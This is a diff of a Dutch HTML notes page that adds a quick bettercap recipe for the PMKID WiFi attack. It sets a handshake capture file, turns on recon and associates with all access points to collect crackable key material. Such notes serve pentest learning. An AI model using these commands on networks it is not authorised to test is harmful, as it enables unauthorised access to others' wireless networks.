@@ -89,6 +89,14 @@ PCAP bestand.</p>
 
 <h1>PMKID attack</h1>
 <p>PMKID (Pairwise Master Key IDentifier) attack kan zonder verbonden clients met de AP</p>
+<h2>Without all the fuzz</h2>
+<p>Om te zien of het uberhaupt werkt:</p>
+<p><ol>
+    <ul>set wifi.handshakes.file /home/kali/Downloads/handshakes.pcap</ul>
+    <ul>wifi.recon on</ul>
+    <ul>wifi.assoc all</ul>
+    <ul>regels met [wifi.client.handshake] geven aan of iets wordt weggeschreven naar /home/kali/Downloads/handshakes.pcap</ul>
+</ol></p>
 <p><ol>
   <ul>set wifi.handshakes.file /home/kali/Downloads/handshakes.pcap</ul>
   <ul>wifi.recon on</ul>
